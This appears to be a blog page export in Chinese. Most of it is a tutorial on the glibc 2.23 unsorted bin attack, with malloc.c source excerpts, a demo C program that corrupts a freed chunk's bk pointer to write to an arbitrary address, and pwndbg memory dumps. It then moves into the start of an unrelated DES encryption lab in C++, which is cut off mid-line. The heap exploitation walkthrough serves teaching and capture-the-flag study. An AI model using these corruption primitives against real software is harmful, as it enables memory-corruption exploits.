原理从下面的源码中可以看到，当将一个unsortedbin取出时，会将bck-&gt;fd的位置写入本unsortedbin的位置\n#glibc-2.23/malloc/malloc.c#源码第3515-3517行\t\t  /* remove from unsorted list */          unsorted_chunks (av)-&gt;bk = bck;          bck-&gt;fd = unsorted_chunks (av);//unsorted_chunks(av)其实是&amp;main_arena.top\n\n换而言之，如果我们控制了bk的值，我们就能将unsorted_chunk(av)写到任意地址。\nDemo接下来我们使用一个demo来演示unsortedbin_attack的原理：\n\n来源：https://www.yuque.com/hxfqg9/bin/tubv6q感谢@yichen师傅的汉化这个程序的目标是通过unsortedbin_attack将stack_var改成一个很大的值。\n\n#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(){    fprintf(stderr, \"unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方\\n\");    fprintf(stderr, \"实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\\n\\n\");    unsigned long stack_var=0;    fprintf(stderr, \"我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\\n\\n\", &amp;stack_var, stack_var);    unsigned long *p=malloc(0x410);    fprintf(stderr, \"一开始先申请一个比较正常的 chunk: %p\\n\",p);    fprintf(stderr, \"再分配一个避免与 top chunk 合并\\n\\n\");    malloc(500);    free(p);    fprintf(stderr, \"当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 %p\\n\",(void*)p[1]);    p[1]=(unsigned long)(&amp;stack_var-2);    fprintf(stderr, \"现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 bk 指针\\n\");    fprintf(stderr, \"我们把目标地址（想要改为超大值的那个地方）减去 0x10 写到 bk 指针:%p\\n\\n\",(void*)p[1]);    malloc(0x410);    fprintf(stderr, \"再去 malloc 的时候可以发现那里的值已经改变为 unsorted bin 的地址\\n\");    fprintf(stderr, \"%p: %p\\n\", &amp;stack_var, (void*)stack_var);}\n\n大致看一下流程，然后开始进行调试。\n\n编译命令：gcc -g demo.c -o demo\n\n开始调试首先对代码的第12行下断点，开始调试程序：\nubuntu@ubuntu:~/Desktop/unsortedbin_demo$ gdb demoGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.  Type \"show copying\"and \"show warranty\" for details.This GDB was configured as \"x86_64-linux-gnu\".Type \"show configuration\" for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type \"help\".Type \"apropos word\" to search for commands related to \"word\"...pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.pwndbg: created $rebase, $ida gdb functions (can be used with print/break)Reading symbols from demo...done.pwndbg&gt; b 12Breakpoint 1 at 0x400722: file demo.c, line 12.pwndbg&gt; rStarting program: /home/ubuntu/Desktop/unsortedbin_demo/demo unsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备我们准备把这个地方 0x7fffffffdd78 的值 0 更改为一个很大的数Breakpoint 1, main () at demo.c:1212\t    unsigned long *p=malloc(0x410);LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA────────────────────────────────────────────────────────────[ REGISTERS ]──────────────────────────────────────────────────────────── RAX  0x51 RBX  0x0 RCX  0x7ffff7b04380 (__write_nocancel+7) ◂— cmp    rax, -0xfff RDX  0x7ffff7dd3770 (_IO_stdfile_2_lock) ◂— 0x0 RDI  0x2 RSI  0x7fffffffb6e0 ◂— 0x87e5acbbe49188e6 R8   0x7ffff7fda700 ◂— 0x7ffff7fda700 R9   0x51 R10  0x0 R11  0x246 R12  0x4005b0 (_start) ◂— xor    ebp, ebp R13  0x7fffffffde70 ◂— 0x1 R14  0x0 R15  0x0 RBP  0x7fffffffdd90 —▸ 0x400870 (__libc_csu_init) ◂— push   r15 RSP  0x7fffffffdd70 —▸ 0x400870 (__libc_csu_init) ◂— push   r15 RIP  0x400722 (main+124) ◂— mov    edi, 0x410─────────────────────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────────────────── ► 0x400722 &lt;main+124&gt;    mov    edi, 0x410   0x400727 &lt;main+129&gt;    call   malloc@plt &lt;malloc@plt&gt;    0x40072c &lt;main+134&gt;    mov    qword ptr [rbp - 0x10], rax   0x400730 &lt;main+138&gt;    mov    rax, qword ptr [rip + 0x200929] &lt;0x601060&gt;   0x400737 &lt;main+145&gt;    mov    rdx, qword ptr [rbp - 0x10]   0x40073b &lt;main+149&gt;    mov    esi, 0x400a18   0x400740 &lt;main+154&gt;    mov    rdi, rax   0x400743 &lt;main+157&gt;    mov    eax, 0   0x400748 &lt;main+162&gt;    call   fprintf@plt &lt;fprintf@plt&gt;    0x40074d &lt;main+167&gt;    mov    rax, qword ptr [rip + 0x20090c] &lt;0x601060&gt;   0x400754 &lt;main+174&gt;    mov    rcx, rax──────────────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────────────In file: /home/ubuntu/Desktop/unsortedbin_demo/demo.c    7     fprintf(stderr, \"实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备\\n\\n\");    8     9     unsigned long stack_var=0;   10     fprintf(stderr, \"我们准备把这个地方 %p 的值 %ld 更改为一个很大的数\\n\\n\", &amp;stack_var, stack_var);   11  ► 12     unsigned long *p=malloc(0x410);   13     fprintf(stderr, \"一开始先申请一个比较正常的 chunk: %p\\n\",p);   14     fprintf(stderr, \"再分配一个避免与 top chunk 合并\\n\\n\");   15     malloc(500);   16    17     free(p);──────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────00:0000│ rsp  0x7fffffffdd70 —▸ 0x400870 (__libc_csu_init) ◂— push   r1501:0008│      0x7fffffffdd78 ◂— 0x002:0010│      0x7fffffffdd80 —▸ 0x7fffffffde70 ◂— 0x103:0018│      0x7fffffffdd88 ◂— 0xbfb16d898364180004:0020│ rbp  0x7fffffffdd90 —▸ 0x400870 (__libc_csu_init) ◂— push   r1505:0028│      0x7fffffffdd98 —▸ 0x7ffff7a2d840 (__libc_start_main+240) ◂— mov    edi, eax06:0030│      0x7fffffffdda0 ◂— 0x107:0038│      0x7fffffffdda8 —▸ 0x7fffffffde78 —▸ 0x7fffffffe20d ◂— '/home/ubuntu/Desktop/unsortedbin_demo/demo'────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────── ► f 0           400722 main+124   f 1     7ffff7a2d840 __libc_start_main+240─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────pwndbg&gt; \n\n看一下这时的本地变量情况：\npwndbg&gt; info localstack_var = 0p = 0x7fffffffde70pwndbg&gt; x/5gx &amp;stack_var0x7fffffffdd78:\t0x0000000000000000\t0x00007fffffffde700x7fffffffdd88:\t0xbfb16d8983641800\t0x00000000004008700x7fffffffdd98:\t0x00007ffff7a2d840pwndbg&gt; x/5gx &amp;p0x7fffffffdd80:\t0x00007fffffffde70\t0xbfb16d89836418000x7fffffffdd90:\t0x0000000000400870\t0x00007ffff7a2d8400x7fffffffdda0:\t0x0000000000000001pwndbg&gt; \n\n从上面的代码框可以看到，此时：● stack_var的值为0，此变量的地址为0x7fffffffdd78● p的值为0x7fffffffde70，此变量的地址为0x7fffffffdd80\n执行unsigned long *p=malloc(0x410);对代码的第13行下断点，让程序执行：unsigned long *p=malloc(0x410);  继续查看内存：\npwndbg&gt; heapAllocated chunkAddr: 0x602000Size: 0x00pwndbg&gt; top_chunkTop chunkAddr: 0x602420Size: 0x00pwndbg&gt; info localstack_var = 0p = 0x602010pwndbg&gt; x/160gx 0x6020000x602000:\t0x0000000000000000\t0x0000000000000421 #malloc_chunk10x602010:\t0x0000000000000000\t0x00000000000000000x602020:\t0x0000000000000000\t0x0000000000000000......（省略内容均为空）0x602420:\t0x0000000000000000\t0x0000000000020be1 #top_chunk......（省略内容均为空）0x6024f0:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; x/16gx &amp;main_arena0x7ffff7dd1b20 &lt;main_arena&gt;:\t0x0000000100000000\t0x00000000000000000x7ffff7dd1b30 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b40 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b50 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b60 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b70 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x0000000000602420 #top_chunk0x7ffff7dd1b80 &lt;main_arena+96&gt;:\t0x0000000000000000\t0x00007ffff7dd1b780x7ffff7dd1b90 &lt;main_arena+112&gt;:\t0x00007ffff7dd1b78\t0x00007ffff7dd1b88pwndbg&gt; \n\n执行malloc(500);现在指针p指向malloc_data，紧接着对代码的第17行下断点让程序执行：malloc(500);，继续查看内存：\npwndbg&gt; heapAllocated chunkAddr: 0x602000Size: 0x00pwndbg&gt; top_chunkTop chunkAddr: 0x602620Size: 0x00pwndbg&gt; x/16gx &amp;main_arena 0x7ffff7dd1b20 &lt;main_arena&gt;:\t0x0000000100000000\t0x00000000000000000x7ffff7dd1b30 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b40 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b50 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b60 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b70 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x0000000000602620 #top_chunk0x7ffff7dd1b80 &lt;main_arena+96&gt;:\t0x0000000000000000\t0x00007ffff7dd1b780x7ffff7dd1b90 &lt;main_arena+112&gt;:\t0x00007ffff7dd1b78\t0x00007ffff7dd1b88pwndbg&gt; x/300gx 0x6020000x602000:\t0x0000000000000000\t0x0000000000000421 #malloc_chunk1......（省略内容均为空）0x602420:\t0x0000000000000000\t0x0000000000000201 #malloc_chunk1......（省略内容均为空）0x602620:\t0x0000000000000000\t0x00000000000209e1 #top_chunk......（省略内容均为空）0x602950:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n\n此处又malloc一个空间是为了避免malloc_chunk1与top_chunk相邻而导致的在free chunk1时不回收到unsortedbin。\n\n释放一个不属于fastbin的chunk，并且该chunk不和top_chunk紧邻时，该chunk会首先被放到unsortedbin中。\n\n执行free(p)对代码的第18行下断点，程序将会执行：free(p);  继续运行程序，查看内存：\nunsortedbinall [corrupted]FD: 0x602000 ◂— 0x0BK: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000pwndbg&gt; x/16gx 0x6020000x602000:\t0x0000000000000000\t0x0000000000000421 #unsortedbin0x602010:\t0x00007ffff7dd1b78\t0x00007ffff7dd1b78    \t\t#fd\t\t\t\t\t#bk0x602020:\t0x0000000000000000\t0x00000000000000000x602030:\t0x0000000000000000\t0x00000000000000000x602040:\t0x0000000000000000\t0x00000000000000000x602050:\t0x0000000000000000\t0x00000000000000000x602060:\t0x0000000000000000\t0x00000000000000000x602070:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; x/30gx &amp;main_arena0x7ffff7dd1b20 &lt;main_arena&gt;:\t0x0000000100000000\t0x0000000000000000......(省略内容均为空)0x7ffff7dd1b70 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x0000000000602620  \t\t\t\t\t\t\t\t\t\t\t\t\t#指向top_chunk\t\t\t\t\t\t\t\t\t\t\t\t\t#unsortedbin指向的地方0x7ffff7dd1b80 &lt;main_arena+96&gt;:\t0x0000000000000000\t0x0000000000602000     \t\t\t\t\t\t\t\t\t\t\t\t#unsortedbin0x7ffff7dd1b90 &lt;main_arena+112&gt;:\t0x0000000000602000\t0x00007ffff7dd1b880x7ffff7dd1ba0 &lt;main_arena+128&gt;:\t0x00007ffff7dd1b88\t0x00007ffff7dd1b980x7ffff7dd1bb0 &lt;main_arena+144&gt;:\t0x00007ffff7dd1b98\t0x00007ffff7dd1ba80x7ffff7dd1bc0 &lt;main_arena+160&gt;:\t0x00007ffff7dd1ba8\t0x00007ffff7dd1bb80x7ffff7dd1bd0 &lt;main_arena+176&gt;:\t0x00007ffff7dd1bb8\t0x00007ffff7dd1bc80x7ffff7dd1be0 &lt;main_arena+192&gt;:\t0x00007ffff7dd1bc8\t0x00007ffff7dd1bd80x7ffff7dd1bf0 &lt;main_arena+208&gt;:\t0x00007ffff7dd1bd8\t0x00007ffff7dd1be80x7ffff7dd1c00 &lt;main_arena+224&gt;:\t0x00007ffff7dd1be8\t0x00007ffff7dd1bf8pwndbg&gt; \n\n在之前的文章中我们说过，当unsortedbin只有一个free_chunk时，它的fd和bk指针都指向unsortedbin本身。\n\n执行p[1]=(unsigned long)(&amp;stack_var-2);对代码第21行下断点，继续：p[1]=(unsigned long)(&amp;stack_var-2);\npwndbg&gt; x/16gx 0x6020000x602000:\t0x0000000000000000\t0x00000000000004210x602010:\t0x00007ffff7dd1b78\t0x00007fffffffdd68    \t\t#fd\t\t\t\t\t#bk被更改0x602020:\t0x0000000000000000\t0x00000000000000000x602030:\t0x0000000000000000\t0x00000000000000000x602040:\t0x0000000000000000\t0x00000000000000000x602050:\t0x0000000000000000\t0x00000000000000000x602060:\t0x0000000000000000\t0x00000000000000000x602070:\t0x0000000000000000\t0x0000000000000000pwndbg&gt; \n\n现在我们已经更改了unsortedbin中malloc_chunk1指针为0x00007fffffffdd68。刚好是刚才申请的 stack_var - 0x10 的位置\npwndbg&gt; unsortedbin unsortedbinall [corrupted]FD: 0x602000 ◂— 0x0BK: 0x602000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602000pwndbg&gt; x/16gx 0x00007fffffffdd680x7fffffffdd68:\t0x00000000004007a8\t0x0000000000400870    \t\t\t#unsortedbin中bk指针所指向的地方0x7fffffffdd78:\t0x0000000000000000\t0x0000000000602010    \t\t\t#想要被修改为超大值的地方0x7fffffffdd88:\t0xbfb16d8983641800\t0x00000000004008700x7fffffffdd98:\t0x00007ffff7a2d840\t0x00000000000000010x7fffffffdda8:\t0x00007fffffffde78\t0x00000001f7ffcca00x7fffffffddb8:\t0x00000000004006a6\t0x00000000000000000x7fffffffddc8:\t0x9c796560ff5ea285\t0x00000000004005b00x7fffffffddd8:\t0x00007fffffffde70\t0x0000000000000000pwndbg&gt; \n\n执行malloc(0x410)执行malloc(0x410)时，会判断所申请的chunk处于smallbin所在的范围，但是此时smallbin中并没有空闲的chunk，所以会去unsortedbin找，发现unsortedbin不空，于是把unsortedbin中的最后一个chunk拿出来。由于上面我们修改了bk指针所指向的地址，所以现在bk指针所指向的地址被加入到了unsortedbin中，也就是说，现在这个地址是unsortedbin中最后一个chunk，malloc之后将在这个地址中创建堆块。\n\nunsortedbin在使用的过程中，采用的遍历顺序是FIFO（First In First out），即插入的时候插入到unsortedbin的头部，取出的时候从链尾获取。\n\nmalloc之后结果如下：pwndbg&gt; unsortedbinunsortedbinall [corrupted]FD: 0x602000 ◂— 0x0BK: 0x7fffffffdd68 —▸ 0x400870 (__libc_csu_init) ◂— push   rbppwndbg&gt; x/30gx &amp;main_arena0x7ffff7dd1b20 &lt;main_arena&gt;:\t0x0000000100000000\t0x00000000000000000x7ffff7dd1b30 &lt;main_arena+16&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b40 &lt;main_arena+32&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b50 &lt;main_arena+48&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b60 &lt;main_arena+64&gt;:\t0x0000000000000000\t0x00000000000000000x7ffff7dd1b70 &lt;main_arena+80&gt;:\t0x0000000000000000\t0x0000000000602620 #top_chunk0x7ffff7dd1b80 &lt;main_arena+96&gt;:\t0x0000000000000000\t0x0000000000602000 #malloc(0x410)0x7ffff7dd1b90 &lt;main_arena+112&gt;:\t0x00007fffffffdd68\t0x00007ffff7dd1b880x7ffff7dd1ba0 &lt;main_arena+128&gt;:\t0x00007ffff7dd1b88\t0x00007ffff7dd1b980x7ffff7dd1bb0 &lt;main_arena+144&gt;:\t0x00007ffff7dd1b98\t0x00007ffff7dd1ba80x7ffff7dd1bc0 &lt;main_arena+160&gt;:\t0x00007ffff7dd1ba8\t0x00007ffff7dd1bb80x7ffff7dd1bd0 &lt;main_arena+176&gt;:\t0x00007ffff7dd1bb8\t0x00007ffff7dd1bc80x7ffff7dd1be0 &lt;main_arena+192&gt;:\t0x00007ffff7dd1bc8\t0x00007ffff7dd1bd80x7ffff7dd1bf0 &lt;main_arena+208&gt;:\t0x00007ffff7dd1bd8\t0x00007ffff7dd1be80x7ffff7dd1c00 &lt;main_arena+224&gt;:\t0x00007ffff7dd1be8\t0x00007ffff7dd1bf8pwndbg&gt; x/16gx 0x7fffffffdd680x7fffffffdd68:\t0x000000000040080a\t0x00000000004008700x7fffffffdd78:\t0x00007ffff7dd1b78\t0x0000000000602010    \t\t\t#现在此地址被更改为较大的数（其值为main_arena+88的地址）0x7fffffffdd88:\t0xbfb16d8983641800\t0x00000000004008700x7fffffffdd98:\t0x00007ffff7a2d840\t0x00000000000000010x7fffffffdda8:\t0x00007fffffffde78\t0x00000001f7ffcca00x7fffffffddb8:\t0x00000000004006a6\t0x00000000000000000x7fffffffddc8:\t0x9c796560ff5ea285\t0x00000000004005b00x7fffffffddd8:\t0x00007fffffffde70\t0x0000000000000000pwndbg&gt;  \n\n申请过程如下图所示：\n\n\n核心代码如下：\n#glibc-2.23/malloc/malloc.c#源码第3515-3517行--------------------------------------------------------------------/* remove from unsorted list */unsorted_chunks (av)-&gt;bk = bck; //unsortedbin的bk改为chunk的bkbck-&gt;fd = unsorted_chunks (av);//将chunk的bk所指向的fd改为unsortedbin的地址//unsorted_chunks(av)其实是&amp;main_arena.top--------------------------------------------------------------------解释：unsorted_chunks (av)-&gt;bk(unsortedbin的bk)= bck(chunk的bk); bck-&gt;fd (chunk的fd)= unsorted_chunks (av);\n\n运行结果如下:\npwndbg&gt; info localstack_var = 140737351850872\t\t\t\t//一个很大的数字 0x7ffff7dd1b78 实际上是 main_arena+88p = 0x602010\n\n反思再来看一下unsortedbin的源码\nwhile ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))     {       bck = victim-&gt;bk;       if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0)           || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))         malloc_printerr (check_action, \"malloc(): memory corruption\",                          chunk2mem (victim), av);       size = chunksize (victim);       /*          If a small request, try to use last remainder if it is the          only chunk in unsorted bin.  This helps promote locality for          runs of consecutive small requests. This is the only          exception to best-fit, and applies only when there is          no exact fit for a small chunk.        */ #显然，bck被修改，并不符合这里的要求       if (in_smallbin_range (nb) &amp;&amp;           bck == unsorted_chunks (av) &amp;&amp;           victim == av-&gt;last_remainder &amp;&amp;           (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE))         {           /* split and reattach remainder */           remainder_size = size - nb;           remainder = chunk_at_offset (victim, nb);           unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;           av-&gt;last_remainder = remainder;           remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);           if (!in_smallbin_range (remainder_size))             {               remainder-&gt;fd_nextsize = NULL;               remainder-&gt;bk_nextsize = NULL;             }           set_head (victim, nb | PREV_INUSE |                     (av != &amp;main_arena ? NON_MAIN_ARENA : 0));           set_head (remainder, remainder_size | PREV_INUSE);           set_foot (remainder, remainder_size);           check_malloced_chunk (av, victim, nb);           void *p = chunk2mem (victim);           alloc_perturb (p, bytes);           return p;         }       /* remove from unsorted list */\n\n可以看出，在将 unsorted bin 的最后一个 chunk 拿出来的过程中，victim 的 fd 并没有发挥作用，所以即使我们修改了其为一个不合法的值也没有关系。然而，需要注意的是，unsorted bin 链表可能就此破坏，在插入 chunk 时，可能会出现问题。\nunsorted bin attack 实现了把一个超级大的数（unsorted bin 的地址）写到一个地方实际上这种攻击方法常常用来修改 global_max_fast 来为进一步的 fastbin attack 做准备我们准备把这个地方 0x7fff7b5eecf8 的值 0 更改为一个很大的数一开始先申请一个比较正常的 chunk: 0x24d0010再分配一个避免与 top chunk 合并当我们释放掉第一个 chunk 之后他会被放到 unsorted bin 中，同时它的 bk 指针为 0x7f691338eb78现在假设有个漏洞，可以让我们修改 free 了的 chunk 的 bk 指针我们把目标地址（想要改为超大值的那个地方）减去 0x10 写到 bk 指针:0x7fff7b5eece8再去 malloc 的时候可以发现那里的值已经改变为 unsorted bin 的地址0x7fff7b5eecf8: 0x7f691338eb78\n\n这里我们可以看到 unsorted bin attack 确实可以修改任意地址的值，但是所修改成的值却不受我们控制，唯一可以知道的是，这个值比较大。这看起来似乎并没有什么用处，但是其实还是有点用的，比如说● 我们通过修改循环的次数来使得程序可以执行多次循环。● 我们可以修改heap中的global_max_fast来使得更大的chunk可以被视为 fastbin，这样我们就可以去执行一些 fastbin attack 了。\n总结感觉全篇看最后一句话就够了(哈哈哈)\n总结一下unsortedbin attack这种攻击方式：首先我们将一个堆块释放到unsortedbin中，然后利用堆溢出修改unsortedbin中chunk的bk指针，这个bk指针是指向target_addr-0x10。当我们malloc申请unsortedbin中的堆块时，target_addr中的值就会变成main_arena+88地址的值\n\ntarget_addr：目标地址（想要修改为超大数的地址） \n\n","categories":["heap"],"tags":["unsoted bin attack"]},{"title":"密码学实验","url":"/2023/04/10/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C/","content":"DES#include &lt;bits/stdc++.h&gt;using namespace std;string string_to_hex(const string&amp; str) //字符串转化为十六进制{    string result=\"\";    string tmp;    stringstream ss;    for(int i=0;i&lt;str.size();i++)    {        ss&lt;&lt;hex&lt;&lt;int(str[i])&lt;&lt;endl;        ss&gt;&gt;tmp;        result+=tmp;    }    return result;}string hex_to_string(const std::string&amp; str){    std::string result;    for (size_t i = 0; i &lt; str.length(); i += 2)//十六进制两个字符为原始字符一个字符    {        std::string byte = str.substr(i, 2);//每次切两个字符        //将十六进制的string转成long再强转成int再转成char        char chr = (char)(int)strtol(byte.c_str(), NULL, 16);        result.push_back(chr);//将处理完的字符压入result中    }    return result;}string hex2bin(string s){    //十六进制转化为二进制    unordered_map&lt;char, string&gt; mp;    mp['0'] = \"0000\";    mp['1'] = \"0001\";    mp['2'] = \"0010\";    mp['3'] = \"0011\";    mp['4'] = \"0100\";    mp['5'] = \"0101\";    mp['6'] = \"0110\";    mp['7'] = \"0111\";    mp['8'] = \"1000\";    mp['9'] = \"1001\";    mp['A'] = \"1010\";    mp['B'] = \"1011\";    mp['C'] = \"1100\";    mp['D'] = \"1101\";    mp['E'] = \"1110\";    mp['F'] = \"1111\";    string bin = \"\";    for (int i = 0; i &lt; s.size(); i++) {        bin += mp[s[i]];    }    return bin;}string bin2hex(string s){    // 二进制转化为16进制    unordered_map&lt;string, string&gt; mp;    mp[\"0000\"] = \"0\";    mp[\"0001\"] = \"1\";    mp[\"0010\"] = \"2\";    mp[\"0011\"] = \"3\";    mp[\"0100\"] = \"4\";    mp[\"0101\"] = \"5\";    mp[\"0110\"] = \"6\";    mp[\"0111\"] = \"7\";    mp[\"1000\"] = \"8\";    mp[\"1001\"] = \"9\";    mp[\"1010\"] = \"A\";    mp[\"1011\"] = \"B\";    mp[\"1100\"] = \"C\";    mp[\"1101\"] = \"D\";    mp[\"1110\"] = \"E\";    mp[\"1111\"] = \"F\";    string hex = \"\";    for (int i = 0; i &lt; s.length(); i += 4) {        string ch = \"\";        ch += s[i];        ch += s[i + 1];        ch += s[i + 2];        ch += s[i + 3];        hex += mp[ch];    }    return hex;}string permute(string k, int* arr, int n){    string per = \"\";    for (int i = 0; i &lt; n; i++) {        per += k[arr[i] - 1];    }    return per;}string shift_left(string k, int shifts){    string s = \"\";    for (int i = 0; i &lt; shifts; i++) {        for (int j = 1; j &lt; 28; j++) {            s += k[j];        }        s += k[0];        k = s;        s = \"\";    }    return k;}string xor_(string a, string b){    string ans = \"\";    for (int i = 0; i &lt; a.size(); i++) {        if (a[i] == b[i]) {            ans += \"0\";        }        else {            ans += \"1\";        }    }    return ans;}string encrypt(string pt, vector&lt;string&gt; rkb,               vector&lt;string&gt; rk){    // 16-&gt;2    pt = hex2bin(pt);    // 初始置换    int initial_perm[64]            = { 58, 50, 42, 34, 26, 18, 10, 2,  60, 52, 44,                36, 28, 20, 12, 4,  62, 54, 46, 38, 30, 22,                14, 6,  64, 56, 48, 40, 32, 24, 16, 8,  57,                49, 41, 33, 25, 17, 9,  1,  59, 51, 43, 35,                27, 19, 11, 3,  61, 53, 45, 37, 29, 21, 13,                5,  63, 55, 47, 39, 31, 23, 15, 7 };    // 初始置换    pt = permute(pt, initial_perm, 64);    cout &lt;&lt; \"初始置换后: \" &lt;&lt; bin2hex(pt)         &lt;&lt; endl;    // 拆分成左右32比特    string left = pt.substr(0, 32);    string right = pt.substr(32, 32);    cout &lt;&lt; \"拆分后: L0=\" &lt;&lt; bin2hex(left)         &lt;&lt; \" R0=\" &lt;&lt; bin2hex(right) &lt;&lt; endl;    // E盒扩展    int exp_d[48]            = { 32, 1,  2,  3,  4,  5,  4,  5,  6,  7,  8,  9,                8,  9,  10, 11, 12, 13, 12, 13, 14, 15, 16, 17,                16, 17, 18, 19, 20, 21, 20, 21, 22, 23, 24, 25,                24, 25, 26, 27, 28, 29, 28, 29, 30, 31, 32, 1 };    // S盒    int s[8][4][16] = {            { 14, 4,  13, 1, 2,  15, 11, 8,  3,  10, 6,  12, 5,9,  0,  7,  0, 15, 7,  4,  14, 2,  13, 1,  10, 6,12, 11, 9,  5, 3,  8,  4,  1,  14, 8,  13, 6,  2, 11, 15, 12, 9, 7,  3,  10, 5,  0,  15, 12, 8,  2, 4,  9,  1,  7, 5,  11, 3,  14, 10, 0,  6,  13 },            { 15, 1,  8,  14, 6,  11, 3, 4,  9,  7,  2,  13, 12, 0,  5,  10, 3,  13, 4,  7, 15, 2,  8,  14, 12, 0, 1,  10, 6,  9,  11, 5,  0, 14, 7,  11, 10, 4,  13, 1,  5,  8,  12, 6,  9,  3, 2,  15, 13, 8,  10, 1, 3,  15, 4,  2,  11, 6,  7, 12, 0,  5,  14, 9 },\t\t\t{ 10, 0,  9,  14, 6,  3,  15, 5,  1,  13, 12, 7,  11, 4,  2,  8,  13, 7,  0,  9,  3,  4, 6,  10, 2,  8,  5,  14, 12, 11, 15, 1,  13, 6,  4,  9,  8,  15, 3,  0,  11, 1,  2,  12, 5,  10, 14, 7,  1,  10, 13, 0,  6,  9,  8, 7,  4,  15, 14, 3,  11, 5,  2,  12 },            { 7,  13, 14, 3,  0,  6,  9,  10, 1,  2, 8,  5,  11, 12, 4,  15, 13, 8,  11, 5,  6,  15, 0, 3,  4,  7, 2,  12, 1,  10, 14, 9,  10, 6,  9,  0, 12, 11, 7, 13, 15, 1,  3,  14, 5,  2,  8,  4,  3, 15, 0,  6, 10, 1,  13, 8,  9,  4,  5,  11, 12, 7, 2,  14 },            { 2,  12, 4, 1,  7,  10, 11, 6, 8,  5,  3,  15, 13, 0,  14, 9, 14, 11, 2,  12, 4, 7,  13, 1,  5,  0, 15, 10, 3, 9,  8,  6,  4,  2, 1,  11, 10, 13, 7, 8,  15, 9, 12, 5,  6,  3,  0, 14, 11, 8,  12, 7, 1,  14, 2, 13, 6,  15, 0,  9, 10, 4,  5,  3 },            { 12, 1,  10, 15, 9,  2,  6,  8,  0,  13, 3, 4, 14, 7,  5,  11, 10, 15, 4,  2,  7,  12, 9,  5, 6, 1, 13, 14, 0,  11, 3,  8,  9,  14, 15, 5,  2, 8, 12, 3,  7,  0,  4,  10, 1,  13, 11, 6,  4,  3, 2, 12, 9,  5,  15, 10, 11, 14, 1,  7,  6,  0,  8, 13 },            { 4,  11, 2,  14, 15, 0,  8, 13, 3,  12, 9,  7,  5,  10, 6,  1,  13, 0,  11, 7, 4,  9,  1,  10, 14, 3, 5,  12, 2,  15, 8,  6,  1, 4,  11, 13, 12, 3,  7, 14, 10, 15, 6,  8,  0,  5, 9,  2,  6,  11, 13, 8, 1,  4,  10, 7,  9,  5,  0, 15, 14, 2,  3,  12 },            { 13, 2,  8, 4,  6,  15, 11, 1,  10, 9, 3, 14, 5, 0,  12, 7, 1,  15, 13, 8,  10, 3,  7, 4, 12, 5, 6,  11, 0, 14, 9,  2,  7,  11, 4,  1, 9, 12, 14, 2,  0,  6, 10, 13, 15, 3,  5,  8,  2, 1, 14, 7, 4,  10, 8, 13, 15, 12, 9,  0,  3,  5, 6, 11 }    };    // P盒置换    int per[32]            = { 16, 7, 20, 21, 29, 12, 28, 17, 1,  15, 23,                26, 5, 18, 31, 10, 2,  8,  24, 14, 32, 27,                3,  9, 19, 13, 30, 6,  22, 11, 4,  25 };    cout &lt;&lt; endl;    for (int i = 0; i &lt; 16; i++) {        string right_expanded = permute(right, exp_d, 48);        string x = xor_(rkb[i], right_expanded);        // S        string op = \"\";        for (int i = 0; i &lt; 8; i++) {            int row = 2 * int(x[i * 6] - '0')                      + int(x[i * 6 + 5] - '0');            int col = 8 * int(x[i * 6 + 1] - '0')                      + 4 * int(x[i * 6 + 2] - '0')                      + 2 * int(x[i * 6 + 3] - '0')                      + int(x[i * 6 + 4] - '0');            int val = s[i][row][col];            op += char(val / 8 